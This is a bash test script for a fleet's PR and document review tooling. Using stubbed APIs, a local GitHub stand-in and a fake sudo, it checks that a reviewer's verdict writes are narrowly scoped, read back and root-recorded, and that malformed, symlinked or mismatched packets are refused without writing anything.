#!/usr/bin/env bash
# Guard for scripts/review-olvas.sh and scripts/review-ellenoriz.sh (reviewer-profil,
# Balazs 2026-10-13 18:07 UTC). review-ellenoriz may write ONE kind of event: the verdict
# of the review the packet names, in the caller's own name. Every refusal below is
# checked twice: the exit code, AND that the stub's event log did not grow (a guard is
# proven by what did not happen, not by its message).
#
# Both scripts keep their fixed places on one line each; this test replaces them in
# COPIES, and fleet-api.sh is a stub that keeps the timeline in a file.
#
# Run: bash scripts/__tests__/review-scripts.test.sh   Exit 0 = all pass.
set -u
umask 022
HERE="$(cd "$(dirname "$0")" && pwd)"
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
fails=0
check() {  # name, expected, actual
  if [ "$2" = "$3" ]; then echo "  [PASS] $1"; else echo "  [FAIL] $1 (got '$3', want '$2')"; fails=$((fails + 1)); fi
}
Z="$T/zona"; mkdir "$Z"
EV="$T/events"; : > "$EV"

# the stub: task-timeline prints the timeline format fleet-api.sh prints, task-event
# appends to it. A task with no file does not exist.
cat > "$T/fleet-api.sh" <<EOF
#!/usr/bin/env bash
case "\$1" in
  task-timeline) f="$T/tl-\$2"; [ -f "\$f" ] || { echo "FAIL http=404"; exit 1; }; cat "\$f" ;;
  task-event)
    [ -f "$T/fail-event" ] && { echo "FAIL http=500"; exit 1; }
    printf '%s\n' "\$*" >> "$EV"
    [ -f "$T/swallow" ] && { echo '{"ok":true}'; exit 0; }
    # with-data: the server stored data on the event, and fleet-api.sh prints it after the ref
    if [ -f "$T/with-data" ]; then
      printf '2026-10-13 20:00:00+0200  esemeny  %-16s %-10s %s %s\n' "\$3" "\$4" "\$6" '{"would_reject": true, "would_reject_reason": "a verdict ref mezojebol hianyzik a repo#PR"}' >> "$T/tl-\$2"
    else
      printf '2026-10-13 20:00:00+0200  esemeny  %-16s %-10s %s\n' "\$3" "\$4" "\$6" >> "$T/tl-\$2"
    fi
    echo '{"ok":true}' ;;
  *) echo "stub: unexpected \$1"; exit 1 ;;
esac
EOF
# the approver's two fixed lines: the main copy names one that is not there (CI, a container
# before D4), so the cases below see the script as it was; the D4 section has its own copy
sed -e "s|^ZONA=.*|ZONA=$Z|" -e "s|^FLEET_API=.*|FLEET_API=$T/fleet-api.sh|" -e 's|^ME=.*|ME=agent-tesztelo|' \
  -e "s|^FLEET_APPROVE=.*|FLEET_APPROVE=$T/nincs-jovahagyo|" -e 's|^SUDO=.*|SUDO=""|' \
  "$HERE/../review-ellenoriz.sh" > "$T/ell.sh"
sed -e 's|^ME=agent-tesztelo|ME=runner|' "$T/ell.sh" > "$T/ell-nem-agens.sh"
# the packets below are owned by whoever runs the test (CI: runner): the main copy also
# accepts that owner, a second copy accepts nobody
RUNNER="$(id -un)"
sed -i "s|^PACKAGERS_RE=.*|PACKAGERS_RE='^(agent-.+\\|marveen\\|$RUNNER)\$'|" "$T/ell.sh"
sed -e "s|^PACKAGERS_RE=.*|PACKAGERS_RE='^senki-sem\$'|" "$T/ell.sh" > "$T/ell-idegen-csomag.sh"
check 'the main copy accepts the runner' 1 "$(grep -cxF "PACKAGERS_RE='^(agent-.+|marveen|$RUNNER)\$'" "$T/ell.sh")"
check 'the second copy accepts nobody' 1 "$(grep -cxF "PACKAGERS_RE='^senki-sem\$'" "$T/ell-idegen-csomag.sh")"
# a stub GitHub on localhost: a PR's JSON from api/pulls-<N>.json, a compare diff from
# api/compare-<head>.diff; anything else 404. The port is written to a file once it listens.
mkdir "$T/api"
cat > "$T/gh-stub.py" <<'EOF'
import http.server, os, re, sys
D = sys.argv[1]
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        m = re.match(r'^/repos/[^/]+/[^/]+/pulls/([0-9]+)$', self.path)
        c = re.match(r'^/repos/[^/]+/[^/]+/compare/[^.]+\.\.\.([0-9a-f]{40})$', self.path)
        f = os.path.join(D, 'pulls-%s.json' % m.group(1)) if m else (os.path.join(D, 'compare-%s.diff' % c.group(1)) if c else '')
        with open(os.path.join(D, 'requests'), 'a') as r:
            r.write(self.path + ' ' + self.headers.get('Accept', '') + ' auth=' + str('Authorization' in self.headers) + '\n')
        if not f or not os.path.isfile(f):
            self.send_response(404); self.end_headers(); return
        body = open(f, 'rb').read()
        self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a):
        pass
s = http.server.HTTPServer(('127.0.0.1', 0), H)
open(os.path.join(D, 'port.tmp'), 'w').write(str(s.server_port))
os.rename(os.path.join(D, 'port.tmp'), os.path.join(D, 'port'))
s.serve_forever()
EOF
python3 -B "$T/gh-stub.py" "$T/api" & STUB=$!
trap 'kill "$STUB" 2>/dev/null; rm -rf "$T"' EXIT
for _ in $(seq 1 100); do [ -f "$T/api/port" ] && break; sleep 0.05; done
GH="http://127.0.0.1:$(cat "$T/api/port")"
sed -e "s|^ZONA=.*|ZONA=$Z|" -e "s|^GH_API=.*|GH_API=$GH|" -e "s|^FEJ_DIFF=.*|FEJ_DIFF=$HERE/../lib/review-fej-diff.py|" \
  "$HERE/../review-olvas.sh" > "$T/olv.sh"
check 'the olvas copy asks the stub GitHub, never the real one' 1 "$(grep -cxF "GH_API=$GH" "$T/olv.sh")"
check 'the copies point at the test zone' 2 "$(grep -c "^ZONA=$Z\$" "$T/ell.sh" "$T/olv.sh" | grep -c ':1$')"
check '... and name a test caller' 1 "$(grep -c '^ME=agent-tesztelo$' "$T/ell.sh")"
ACTOR=tesztelo
# a packet made the way review-csomag.sh makes it, plus the two hand-made shapes
mkdir "$Z/pr-marveen70" "$Z/pr-1700" "$Z/pr-c80"
printf 'marveen PR 70 \ntask_id: tsk-a\nfej: 1234567890abcdef1234567890abcdef12345678\nmerge-base: aaa\norigin/main: aaa\n' > "$Z/pr-marveen70/README.md"
printf 'PR: KratoBal/acropora-os #1700\nfej: abcdef1\ntask: tsk-b\n' > "$Z/pr-1700/README"
printf 'PR KratoBal/acropora-commerce #80, task tsk-c\nhead 7654321fedcba\n' > "$Z/pr-c80/README"
git init -q "$T/r"; printf 'a\n' > "$T/r/f.txt"
git -C "$T/r" add f.txt; git -C "$T/r" -c user.name=t -c user.email=t@t commit -q -m a
printf 'b\n' >> "$T/r/f.txt"; printf 'x\n' > "$T/r/g.txt"; git -C "$T/r" add -N g.txt
git -C "$T/r" diff > "$Z/pr-marveen70/diff.patch"
cp "$Z/pr-marveen70/diff.patch" "$Z/pr-1700/diff.patch"
for t in tsk-a tsk-b tsk-c; do
  printf '2026-10-13 19:00:00+0200  esemeny  review_requested murena     PR\n' > "$T/tl-$t"
done
printf '2026-10-13 19:00:00+0200  esemeny  started          murena     \n' > "$T/tl-nincs-kerve"
ell() { bash "$T/ell.sh" "$@" >"$T/out" 2>&1; echo $?; }
olv() { bash "$T/olv.sh" "$@" >"$T/out" 2>&1; echo $?; }
events() { wc -l < "$EV" | tr -d ' '; }

echo 'review-olvas: one call'
check 'a packet -> 0' 0 "$(olv marveen70)"
check '... prints the README' 1 "$(grep -c '^task_id: tsk-a$' "$T/out")"
check '... and both changed files with their counts' 2 "$(grep -cE '^   \+1 +-(0|1) +(f|g)\.txt$' "$T/out")"
check '... and the total' 1 "$(grep -c '^   osszesen: 2 fajl, +2 -0$' "$T/out")"
check 'a path as packet name -> 2' 2 "$(olv ../x)"
check 'a missing packet -> 1' 1 "$(olv 999)"
mkdir "$Z/pr-1701"; ln -s "$Z/pr-marveen70/diff.patch" "$Z/pr-1701/diff.patch"
check 'a symlinked patch is not read -> 1' 1 "$(olv 1701)"
check '... and says so' 1 "$(grep -c 'symlink vagy nem fajl, kihagyva' "$T/out")"
ln -s "$Z/pr-marveen70" "$Z/pr-1702"
check 'a symlinked packet folder -> 1' 1 "$(olv 1702)"

echo 'review-ellenoriz: the one write it may do'
check 'the packet task, APPROVE -> 0' 0 "$(ell marveen70 tsk-a APPROVE)"
check '... one event' 1 "$(events)"
check '... kind verdict, actor the caller, ref from the packet' \
  "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/acroveliq#70 pr-marveen70 fej 1234567890abcdef1234567890abcdef12345678" "$(tail -n1 "$EV")"
check '... and it says it read it back' 1 "$(grep -c '^OK verdict rogzitve' "$T/out")"
check 'the same verdict again (a second round) -> 0, read back as a NEW line' 0 "$(ell marveen70 tsk-a APPROVE)"
check 'hand-made README with task: -> 0' 0 "$(ell 1700 tsk-b CHANGES)"
check '... the PR named from the packet name (pr-N: acropora-os)' "task-event tsk-b verdict $ACTOR  CHANGES KratoBal/acropora-os#1700 pr-1700 fej abcdef1" "$(tail -n1 "$EV")"
check 'hand-made README with task in the title -> 0' 0 "$(ell c80 tsk-c CHANGES)"
check '... ref with the head from "head <sha>"' "task-event tsk-c verdict $ACTOR  CHANGES KratoBal/acropora-commerce#80 pr-c80 fej 7654321fedcba" "$(tail -n1 "$EV")"
n="$(events)"

echo 'review-ellenoriz: what it refuses, and that nothing was written'
check 'a task the packet does not name -> 1' 1 "$(ell marveen70 tsk-b APPROVE)"
check 'a verdict word outside the two -> 2' 2 "$(ell marveen70 tsk-a done)"
check 'a lower-case verdict -> 2' 2 "$(ell marveen70 tsk-a approve)"
check 'a path as packet name -> 2' 2 "$(ell ../../x tsk-a APPROVE)"
check 'an id with a space -> 2' 2 "$(ell marveen70 'tsk-a x' APPROVE)"
check 'a fourth argument (an actor, a ref) -> 2' 2 "$(ell marveen70 tsk-a APPROVE barracuda)"
check 'a missing packet -> 1' 1 "$(ell 999 tsk-a APPROVE)"
check 'a symlinked packet folder -> 1' 1 "$(ell 1702 tsk-a APPROVE)"
mkdir "$Z/pr-1703"; ln -s "$Z/pr-marveen70/README.md" "$Z/pr-1703/README.md"
check 'a symlinked README -> 1' 1 "$(ell 1703 tsk-a APPROVE)"
mkdir "$Z/pr-1704"; printf 'fej: abcdef1\n' > "$Z/pr-1704/README"
check 'a README naming no task -> 1' 1 "$(ell 1704 tsk-a APPROVE)"
mkdir "$Z/pr-1705"; printf 'task_id: nincs-kerve\n' > "$Z/pr-1705/README.md"
check 'a task with no review_requested -> 1' 1 "$(ell 1705 nincs-kerve APPROVE)"
mkdir "$Z/pr-1706"; printf 'task_id: nincs-ilyen\n' > "$Z/pr-1706/README.md"
check 'a task that does not exist -> 1' 1 "$(ell 1706 nincs-ilyen APPROVE)"
mkdir "$Z/pr-1707"; printf 'task_id: tsk-a-masik\n' > "$Z/pr-1707/README.md"
cp "$T/tl-tsk-a" "$T/tl-tsk-a-masik"
check 'a task id that only STARTS like the named one -> 1' 1 "$(ell 1707 tsk-a APPROVE)"
check 'a caller that is not an agent user -> 1' 1 "$(bash "$T/ell-nem-agens.sh" marveen70 tsk-a APPROVE >/dev/null 2>&1; echo $?)"
mkdir "$Z/pr-1708"; printf 'task_id: tsk-a\nmegjegyzes: a task blocks merging until review\n' > "$Z/pr-1708/README.md"
cp "$T/tl-tsk-a" "$T/tl-blocks"
check 'a prose line ("a task blocks ...") names no task -> 1' 1 "$(ell 1708 blocks APPROVE)"
check 'a packet owner that is not a packager -> 1' 1 "$(bash "$T/ell-idegen-csomag.sh" marveen70 tsk-a APPROVE >/dev/null 2>&1; echo $?)"
mkdir "$Z/pr-marveen71"; printf 'marveen PR 71 \npr: KratoBal/marveen#17\ntask_id: tsk-a\nfej: 1234567\n' > "$Z/pr-marveen71/README.md"
check 'a README pr: line naming another PR than the packet -> 1' 1 "$(ell marveen71 tsk-a APPROVE)"
mkdir "$Z/pr-marveen72"; printf 'marveen PR 72 \npr: KratoBal/acropora-os#72\ntask_id: tsk-a\nfej: 1234567\n' > "$Z/pr-marveen72/README.md"
check 'a README pr: line naming another repo than the packet -> 1' 1 "$(ell marveen72 tsk-a APPROVE)"
check 'packet 0 -> 2' 2 "$(ell 0 tsk-a APPROVE)"
check 'a packet number with a leading zero -> 2' 2 "$(ell marveen070 tsk-a APPROVE)"
check 'no refusal wrote an event' "$n" "$(events)"
mkdir "$Z/pr-1709"; printf 'os PR 1709 \ntask_id: tsk-a\nfej: 1111111aaaa\nv2: task_id tsk-b, fej 2222222bbbb, merge-base x, origin/main y \n' > "$Z/pr-1709/README.md"
check 'a later round line (vN: task_id X,) binds that task -> 0' 0 "$(ell 1709 tsk-b CHANGES)"
check '... and the ref names THAT round head, not the first' "task-event tsk-b verdict $ACTOR  CHANGES KratoBal/acropora-os#1709 pr-1709 fej 2222222bbbb" "$(tail -n1 "$EV")"
mkdir "$Z/pr-marveen73"; printf 'marveen PR 73 \npr: KratoBal/marveen#73\ntask_id: tsk-a\nfej: 3333333cccc\n' > "$Z/pr-marveen73/README.md"
check 'a README pr: line with the fleet repo old name (a packet from before the rename) -> 0' 0 "$(ell marveen73 tsk-a APPROVE)"
check '... and the verdict keeps the name the README gave' "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/marveen#73 pr-marveen73 fej 3333333cccc" "$(tail -n1 "$EV")"
mkdir "$Z/pr-marveen74"; printf 'marveen PR 74 \npr: KratoBal/acroveliq#74\ntask_id: tsk-a\nfej: 4444444dddd\n' > "$Z/pr-marveen74/README.md"
check 'a README pr: line that agrees (review-csomag.sh shape, the new name) -> 0' 0 "$(ell marveen74 tsk-a APPROVE)"
check '... ref KratoBal/acroveliq#74' "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/acroveliq#74 pr-marveen74 fej 4444444dddd" "$(tail -n1 "$EV")"
n="$(events)"

echo 'the profile: the Task Core writers are denied for the reviewer only'
RV="$HERE/../../templates/profiles/reviewer.json"; RR="$HERE/../../templates/profiles/researcher-reader.json"
for c in task-event kiadas task-new task-session handoff-write; do
  rule="\"Bash(bash \${HOME}/marveen/scripts/fleet-api.sh $c:*)\""
  check "reviewer.json denies fleet-api.sh $c" 1 "$(grep -cF "$rule" "$RV")"
  check "... researcher-reader.json (polip) does not" 0 "$(grep -cF "$rule" "$RR")"
done
check 'review-ellenoriz.sh writes from its own process, not through the harness' 1 \
  "$(grep -cF 'bash "$FLEET_API" task-event "$TASK" verdict "$ACTOR"' "$HERE/../review-ellenoriz.sh")"

echo 'review-ellenoriz: the write is read back'
touch "$T/fail-event"
check 'the event call fails -> 1' 1 "$(ell marveen70 tsk-a CHANGES)"
rm "$T/fail-event"
touch "$T/swallow"
check 'a 200 that left no line on the timeline -> 1' 1 "$(ell marveen70 tsk-a CHANGES)"
check '... and says why' 1 "$(grep -c 'nem latszik az uj sor' "$T/out")"
rm "$T/swallow"

echo 'the AI service packet (acrobot 30257): pr-ai<N> is KratoBal/acropora-ai-agent#N'
n="$(events)"
mkdir "$Z/pr-ai37"
# the shape murena made by hand on 2026-10-14 (pr-ai37), and the second round line
printf 'KratoBal/acropora-ai-agent#37 feat(recommendation): three parts\ntask_id: tsk-a\nfej: 278c1d363134486fd48c69a8e3ae7d47c4d0d296\nmerge-base: fe29f6e\nv2: task_id tsk-a, fej 2a4c62f661f628ad557170e9ed80aadecabec6fd\n' > "$Z/pr-ai37/README"
cp "$Z/pr-marveen70/diff.patch" "$Z/pr-ai37/diff.patch"
check 'olvas: an ai packet -> 0' 0 "$(olv ai37)"
check 'ellenoriz: an ai packet -> 0' 0 "$(ell ai37 tsk-a APPROVE)"
check '... the ref names the AI repo and the latest round head' \
  "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/acropora-ai-agent#37 pr-ai37 fej 2a4c62f661f628ad557170e9ed80aadecabec6fd" "$(tail -n1 "$EV")"
mkdir "$Z/pr-ai38"; printf 'ai PR 38 \npr: KratoBal/acropora-os#38\ntask_id: tsk-a\nfej: 1234567\n' > "$Z/pr-ai38/README.md"
check 'an ai packet whose README pr: names another repo -> 1' 1 "$(ell ai38 tsk-a APPROVE)"
check 'an unknown prefix -> 2' 2 "$(ell xy37 tsk-a APPROVE)"
check 'olvas: an unknown prefix -> 2' 2 "$(olv xy37)"
check 'one event, from the good packet only' "$((n + 1))" "$(events)"

echo 'the customer project packet (acrobot 32393): pr-cap<N> is KratoBal/caparium-napplo#N, c<N> stays commerce'
n="$(events)"
mkdir "$Z/pr-cap3"
printf 'KratoBal/caparium-napplo#3 feat: belepes\ntask_id: tsk-a\nfej: 3333333333333333333333333333333333333333\n' > "$Z/pr-cap3/README"
cp "$Z/pr-marveen70/diff.patch" "$Z/pr-cap3/diff.patch"
check 'olvas: a cap packet -> 0' 0 "$(olv cap3)"
check 'ellenoriz: a cap packet -> 0' 0 "$(ell cap3 tsk-a APPROVE)"
check '... the ref names the Caparium repo' \
  "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/caparium-napplo#3 pr-cap3 fej 3333333333333333333333333333333333333333" "$(tail -n1 "$EV")"
mkdir "$Z/pr-cap4"; printf 'cap PR 4 \npr: KratoBal/acropora-commerce#4\ntask_id: tsk-a\nfej: 1234567\n' > "$Z/pr-cap4/README.md"
check 'a cap packet whose README pr: names another repo -> 1' 1 "$(ell cap4 tsk-a APPROVE)"
check 'one event, from the good cap packet only' "$((n + 1))" "$(events)"

echo 'a document packet (task review-docs-verdict): the file path in the ref, the copy checked'
n="$(events)"
mkdir "$Z/doc-tsk-d"; printf 'terv\n' > "$Z/doc-tsk-d/v1-terv.md"
H1="$(sha256sum < "$Z/doc-tsk-d/v1-terv.md")"; H1="${H1%% *}"
printf 'docs exchange/acroveliq/terv.md \ntask_id: tsk-d\nfajl: exchange/acroveliq/terv.md\nsha256: %s\n' "$H1" > "$Z/doc-tsk-d/README.md"
printf '2026-10-13 19:00:00+0200  esemeny  review_requested nautilus   exchange/acroveliq/terv.md\n' > "$T/tl-tsk-d"
check 'olvas: a document packet -> 0' 0 "$(olv doc-tsk-d)"
check '... names the copy with its sha256 and the path to read' 2 "$(grep -cE "^   (sha256 $H1|olvasd: $Z/doc-tsk-d/v1-terv\.md)\$" "$T/out")"
check 'the first round -> 0' 0 "$(ell doc-tsk-d tsk-d APPROVE)"
check '... the ref carries the path, the packet and the hash' \
  "task-event tsk-d verdict $ACTOR  APPROVE exchange/acroveliq/terv.md doc-tsk-d sha256 ${H1:0:12}" "$(tail -n1 "$EV")"
printf 'terv v2\n' > "$Z/doc-tsk-d/v2-terv2.md"
H2="$(sha256sum < "$Z/doc-tsk-d/v2-terv2.md")"; H2="${H2%% *}"
printf 'v2: task_id tsk-d, fajl exchange/acroveliq/terv2.md, sha256 %s masodik kor\n' "$H2" >> "$Z/doc-tsk-d/README.md"
check 'a later round -> 0' 0 "$(ell doc-tsk-d tsk-d CHANGES)"
check '... the ref names THAT round file and hash' \
  "task-event tsk-d verdict $ACTOR  CHANGES exchange/acroveliq/terv2.md doc-tsk-d sha256 ${H2:0:12}" "$(tail -n1 "$EV")"
check 'olvas lists both rounds' 2 "$(olv doc-tsk-d >/dev/null; grep -c '^   olvasd: ' "$T/out")"
# acrobot 31015: a verdict whose event carries data (a would_reject mark) was recorded, and
# the read-back still failed, because the timeline prints the data after the ref
touch "$T/with-data"
check 'a recorded verdict with data on its event -> 0' 0 "$(ell doc-tsk-d tsk-d CHANGES)"
check '... a second identical one too (the count before already holds the first)' 0 "$(ell doc-tsk-d tsk-d CHANGES)"
check '... and the would_reject mark is named as a warning' 1 "$(grep -c '^FIGYELEM: a szerver would_reject jelet tett az esemenyre (kenyszerit modban 409 lenne): a verdict ref mezojebol hianyzik a repo#PR$' "$T/out")"
rm "$T/with-data"
check 'without data, no warning' 0 "$(ell doc-tsk-d tsk-d APPROVE)"
check '... none printed' 0 "$(grep -c '^FIGYELEM' "$T/out")"
n="$(events)"
for x in e f g h i j; do printf '2026-10-13 19:00:00+0200  esemeny  review_requested nautilus   x/a.md\n' > "$T/tl-tsk-$x"; done
mkdir "$Z/doc-tsk-e"; printf 'eredeti\n' > "$Z/doc-tsk-e/v1-a.md"
HE="$(sha256sum < "$Z/doc-tsk-e/v1-a.md")"; HE="${HE%% *}"
printf 'docs x/a.md \ntask_id: tsk-e\nfajl: x/a.md\nsha256: %s\n' "$HE" > "$Z/doc-tsk-e/README.md"
printf 'kicserelve\n' > "$Z/doc-tsk-e/v1-a.md"
check 'a copy changed after packaging -> 1' 1 "$(ell doc-tsk-e tsk-e APPROVE)"
check '... and says so' 1 "$(grep -c 'csomagolas utan valtozott' "$T/out")"
mkdir "$Z/doc-tsk-f"; printf 'docs x/a.md \ntask_id: tsk-f\nfajl: x/a.md\nsha256: %s\n' "$HE" > "$Z/doc-tsk-f/README.md"
check 'the copy missing -> 1' 1 "$(ell doc-tsk-f tsk-f APPROVE)"
mkdir "$Z/doc-tsk-g"; printf 'x\n' > "$Z/doc-tsk-g/real.md"; ln -s "$Z/doc-tsk-g/real.md" "$Z/doc-tsk-g/v1-a.md"
HG="$(sha256sum < "$Z/doc-tsk-g/real.md")"; HG="${HG%% *}"
printf 'docs x/a.md \ntask_id: tsk-g\nfajl: x/a.md\nsha256: %s\n' "$HG" > "$Z/doc-tsk-g/README.md"
check 'a symlinked copy -> 1' 1 "$(ell doc-tsk-g tsk-g APPROVE)"
mkdir "$Z/doc-tsk-h"; printf 'docs x/a.md \ntask_id: tsk-h\nfajl: x/a.md\n' > "$Z/doc-tsk-h/README.md"; printf 'x\n' > "$Z/doc-tsk-h/v1-a.md"
check 'a README with no sha256 -> 1' 1 "$(ell doc-tsk-h tsk-h APPROVE)"
mkdir "$Z/doc-tsk-i"; printf 'x\n' > "$Z/doc-tsk-i/v1-a.md"; HI="$(sha256sum < "$Z/doc-tsk-i/v1-a.md")"; HI="${HI%% *}"
printf 'docs a.md \ntask_id: tsk-i\nfajl: a.md\nsha256: %s\n' "$HI" > "$Z/doc-tsk-i/README.md"
check 'a path with no folder (the Task Core would not read it as a path) -> 1' 1 "$(ell doc-tsk-i tsk-i APPROVE)"
mkdir "$Z/doc-tsk-j"; cp "$Z/doc-tsk-i/v1-a.md" "$Z/doc-tsk-j/v1-a.md"
printf 'docs x/a.md \npr: KratoBal/marveen#1\ntask_id: tsk-j\nfajl: x/a.md\nsha256: %s\n' "$HI" > "$Z/doc-tsk-j/README.md"
check 'a document packet whose README names a PR -> 1' 1 "$(ell doc-tsk-j tsk-j APPROVE)"
mkdir "$Z/doc-tsk-k"; cp "$Z/doc-tsk-d/v1-terv.md" "$Z/doc-tsk-k/v1-terv.md"
printf 'docs exchange/acroveliq/terv.md \ntask_id: tsk-a\nfajl: exchange/acroveliq/terv.md\nsha256: %s\n' "$H1" > "$Z/doc-tsk-k/README.md"
check 'a doc folder of one task whose README names another (tsk-a has a review request) -> 1' 1 "$(ell doc-tsk-k tsk-a APPROVE)"
check '... and says why' 1 "$(grep -c 'nem ennek a feladatnak a mappaja' "$T/out")"
check 'the document packet of another task -> 1' 1 "$(ell doc-tsk-d tsk-a APPROVE)"
check 'doc- with a path in it -> 2' 2 "$(ell doc-../x tsk-d APPROVE)"
check 'doc- alone -> 2' 2 "$(ell doc- tsk-d APPROVE)"
check 'olvas: doc- with a path -> 2' 2 "$(olv doc-../x)"
check 'no document refusal wrote an event' "$n" "$(events)"

echo 'the root record (the D4 step list E3 (a)): where the approver is installed'
check 'the script has the two fixed lines, once each' 2 \
  "$(grep -cxE '(FLEET_APPROVE=/usr/local/sbin/fleet-approve|SUDO="sudo -n")' "$HERE/../review-ellenoriz.sh")"
check 'the main copy has neither of them' 0 "$(grep -cxE '(FLEET_APPROVE=/usr/local/sbin/fleet-approve|SUDO="sudo -n")' "$T/ell.sh")"
RC="$T/root-calls"
AC="$T/approve-calls"
cat > "$T/fleet-approve" <<EOF
#!/usr/bin/env bash
if [ "\$1" = approve ]; then
  [ -f "$T/approve-refused" ] && { echo "fleet-approve: refused: the reviewed head is not the PR head: a push came after the review" >&2; exit 10; }
  [ -f "$T/approve-failed" ] && { echo "fleet-approve: failed: GitHub review HTTP 502" >&2; exit 13; }
  [ -f "$T/approve-norights" ] && { echo "fleet-approve: token rights missing: GitHub review HTTP 403: Resource not accessible by personal access token" >&2; exit 14; }
  printf '%s\n' "\$*" >> "$AC"
  echo "approved \$2#\$3 at 1234"
  exit 0
fi
[ -f "$T/fail-root" ] && { echo "fleet-approve: refused: agent-tesztelo is not an approver" >&2; exit 10; }
printf '%s\n' "\$*" >> "$RC"
echo "recorded \$5 \$2#\$3 at \$6, task \$4"
EOF
chmod 755 "$T/fleet-approve"
# a sudo stand-in: -n -l asks the policy (no rule while no-rule exists), -n <cmd> runs it,
# and without the rule the run itself is refused too, as sudo -n would
cat > "$T/sudo" <<EOF
#!/usr/bin/env bash
[ "\$1" = -n ] || { echo "sudo stub: -n expected"; exit 1; }
shift
[ -f "$T/no-rule" ] && { echo "sudo: a password is required" >&2; exit 1; }
# a policy without the approve line: -l <approver> approve ... and the run itself are refused
[ -f "$T/no-approve-rule" ] && { [ "\$3" = approve ] || [ "\$2" = approve ]; } && { echo "sudo: a password is required" >&2; exit 1; }
[ "\$1" = -l ] && exit 0
exec "\$@"
EOF
chmod 755 "$T/sudo"
sed -e "s|^FLEET_APPROVE=.*|FLEET_APPROVE=$T/fleet-approve|" -e "s|^SUDO=.*|SUDO=\"$T/sudo -n\"|" "$T/ell.sh" > "$T/ell-d4.sh"
check 'the D4 copy names the stub sudo' 1 "$(grep -cxF "SUDO=\"$T/sudo -n\"" "$T/ell-d4.sh")"
ell4() { HOME="$T/home4" bash "$T/ell-d4.sh" "$@" >"$T/out" 2>&1; echo $?; }
# the match markers review-olvas.sh --fej leaves on EGYEZIK (E3 (b)): an APPROVE is root-recorded only with one
mkdir -p "$T/home4/.review-fej"; chmod 700 "$T/home4/.review-fej"
for f in KratoBal-acroveliq-70-1234567890abcdef1234567890abcdef12345678 \
         KratoBal-acropora-ai-agent-37-2a4c62f661f628ad557170e9ed80aadecabec6fd \
         KratoBal-acroveliq-75-5555555555555555555555555555555555555555; do
  : > "$T/home4/.review-fej/$f.egyezik"
done
roots() { [ -f "$RC" ] && wc -l < "$RC" | tr -d ' ' || echo 0; }
check 'not installed: the verdict -> 0, as before' 0 "$(ell marveen70 tsk-a APPROVE)"
check '... says no root record was made' 1 "$(grep -c '^MEGJEGYZES: a gepi jovahagyo itt nincs telepitve' "$T/out")"
check '... and called nothing' 0 "$(roots)"
n="$(events)"
check 'installed: a 40-character head -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
check '... the root record: repo, PR, task, verdict and the full head' \
  'record KratoBal/acroveliq 70 tsk-a APPROVE 1234567890abcdef1234567890abcdef12345678' "$(tail -n1 "$RC")"
check '... after the timeline verdict, not instead of it' "$((n + 1))" "$(events)"
check '... and says it' 1 "$(grep -c '^OK root rekord: recorded APPROVE' "$T/out")"
check 'a CHANGES is recorded too (the approver needs the latest, either way)' 0 "$(ell4 marveen70 tsk-a CHANGES)"
check '... as CHANGES' 'record KratoBal/acroveliq 70 tsk-a CHANGES 1234567890abcdef1234567890abcdef12345678' "$(tail -n1 "$RC")"
check 'the AI repo, the latest round head' 0 "$(ell4 ai37 tsk-a APPROVE)"
check '... named for the approver' 'record KratoBal/acropora-ai-agent 37 tsk-a APPROVE 2a4c62f661f628ad557170e9ed80aadecabec6fd' "$(tail -n1 "$RC")"
mkdir "$Z/pr-marveen75"; printf 'marveen PR 75 \npr: KratoBal/marveen#75\ntask_id: tsk-a\nfej: 5555555555555555555555555555555555555555\n' > "$Z/pr-marveen75/README.md"
check 'a packet from before the rename -> 0' 0 "$(ell4 marveen75 tsk-a APPROVE)"
check '... the timeline keeps the old name, the root record has the current one' \
  "task-event tsk-a verdict $ACTOR  APPROVE KratoBal/marveen#75 pr-marveen75 fej 5555555555555555555555555555555555555555|record KratoBal/acroveliq 75 tsk-a APPROVE 5555555555555555555555555555555555555555" \
  "$(tail -n1 "$EV")|$(tail -n1 "$RC")"
r="$(roots)"; n="$(events)"
check 'a 7-character head -> 1' 1 "$(ell4 1700 tsk-b APPROVE)"
check '... says the timeline has it and the root record does not' 1 "$(grep -c '^FAIL: az idovonalon rogzitve, de a csomag feje nem 40 jegyu' "$T/out")"
check '... the timeline verdict was written, the approver not called' "$((n + 1))|$r" "$(events)|$(roots)"
touch "$T/fail-root"
check 'the approver refuses -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... and its answer is passed on' 1 "$(grep -c '^FAIL: az idovonalon rogzitve, de a root rekord NEM: fleet-approve: refused' "$T/out")"
rm "$T/fail-root"
echo 'the root record needs the head diff MATCH for an APPROVE (E3 (b))'
FJ="$T/home4/.review-fej/KratoBal-acroveliq-70-1234567890abcdef1234567890abcdef12345678.egyezik"
: > "${FJ%.egyezik}.patch"
mv "$FJ" "$FJ.el"
check 'the head diff alone, without the match marker, is not enough -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
r="$(roots)"; n="$(events)"
check 'an APPROVE without the head diff -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
check '... says to run review-olvas.sh --fej' 1 "$(grep -c 'futtasd a review-olvas.sh --fej marveen70 hivast; ha ELTER-t ad' "$T/out")"
check '... the timeline verdict written, the approver not called' "$((n + 1))|$r" "$(events)|$(roots)"
check 'a CHANGES needs no head diff -> 0, recorded' "0|$((r + 1))" "$(ell4 marveen70 tsk-a CHANGES)|$(roots)"
: > "$T/home4/.review-fej/KratoBal-acroveliq-70-$(printf 'e%.0s' $(seq 40)).egyezik"
check 'another head diff of the same PR does not count -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
ln -s "$FJ.el" "$FJ"
check 'a symlinked head diff -> 1' 1 "$(ell4 marveen70 tsk-a APPROVE)"
rm "$FJ"; mv "$FJ.el" "$FJ"
check 'with it back -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
r="$(roots)"
touch "$T/no-rule"
check 'installed, but sudo does not allow record yet (a live-tree update before the bootstrap) -> 0' 0 "$(ell4 marveen70 tsk-a APPROVE)"
